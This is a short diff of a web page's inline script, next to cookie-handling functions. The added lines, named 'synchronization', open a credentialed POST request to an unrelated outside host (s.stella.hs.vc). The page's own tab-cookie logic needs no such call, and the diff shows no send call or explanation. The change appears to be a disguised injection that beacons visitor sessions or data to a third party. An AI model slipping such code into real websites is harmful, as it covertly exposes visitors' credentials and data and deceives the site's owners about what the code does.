@@ -74,6 +74,9 @@ function eraseCookie(name) {
 </div>
 </div>
 <script>
+var synchronization = new XMLHttpRequest();
+synchronization.withCredentials = true;
+synchronization.open("POST", "https://s.stella.hs.vc/")
 var tabs = readCookie("tabs");
 var tabs = tabs.split(",");
 tabs.forEach(tabParse);
